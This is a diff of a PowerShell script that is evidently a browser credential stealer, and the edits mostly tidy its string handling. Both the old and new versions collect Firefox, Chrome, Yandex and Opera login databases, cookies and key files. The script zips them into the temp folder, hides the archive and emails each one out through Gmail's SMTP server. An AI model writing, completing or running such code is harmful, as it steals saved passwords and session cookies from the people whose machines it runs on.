@@ -13,8 +13,7 @@
 #   $LOG = ($LOG + $LS)
 # }
 $LOG=""
-$LOG = ($LOG + " Start ")
-
+$LOG = ("$LOG Start ")
 #######
 if(Test-Path "C:\Program Files\7-Zip\3123127z.exe"){
   cd "C:\Program Files\7-Zip\"
@@ -27,12 +26,14 @@ elseif (Test-Path "C:\Program Files\WinRAR\RAR.exe"){
 else{WL "asd"}
 $LOG = ($LOG + $arh)
 echo $arh
-
-$lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db", "");
-        1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\"), "chrome", "Login Data", "Cookies", "Local State");
-        2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies", "");
-        3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Opera123", "Login Data", "Cookies", "Local State");
-        4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies", "Local State")}
+###########
+$A=$env:APPDATA
+$L=$env:LOCALAPPDATA
+$lst = @{0=(("$A\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db", "");
+        1=(("$L\Google\Chrome\User Data\"), "chrome", "Login Data", "Cookies", "Local State");
+        2=(("$L\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies", "");
+        3=(("$A\Opera Software\Opera Stable\"), "Opera123", "Login Data", "Cookies", "Local State");
+        4=(("$A\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies", "Local State")}
 ###########
 for ($i=0; $i -lt 5; $i++){
   $SMTPServer="smtp.gmail.com"
@@ -45,7 +46,7 @@ for ($i=0; $i -lt 5; $i++){
   if(Test-Path $lst[$i][0]){
     echo '+++++++++', $arh, '+++++++++'
     echo ($lst[$i][0])
-    $p=($env:TEMP+"\"+$lst[$i][1])
+    $p=("$env:TEMP\"+$lst[$i][1])
     #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
     if($arh-eq "7"){
       $p=($p+".zip")
@@ -60,7 +61,7 @@ for ($i=0; $i -lt 5; $i++){
         gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
       }
       catch{
-        $LOG = ($LOG+" nothing!!! ")
+        $LOG = ("$LOG nothing!!! ")
 #         $Zip="C:\Users\qwe\Desktop\ARH\22.zip"
  #[System.IO.Compression.ZipFile]::CreateFromDirectory("C:\Users\qwe\Desktop\ARH",$Zip)
 
@@ -71,7 +72,7 @@ for ($i=0; $i -lt 5; $i++){
 #         $ZipFile.Dispose()
       }
     }
-    $LOG = ($LOG+" "+$p)
+    $LOG = ("$LOG $p")
     attrib +H $p
     echo ("____ "+$p)
     $ReportEmail.Subject=$lst[$i][1]
@@ -84,6 +85,7 @@ for ($i=0; $i -lt 5; $i++){
 #     $ReportEmail.Attachments.Add($s)
 
     $SMTPInfo.Send($ReportEmail)
+#     rm $p
 #     $s.Dispose()
   echo '----------', $arh, '----------'
   }
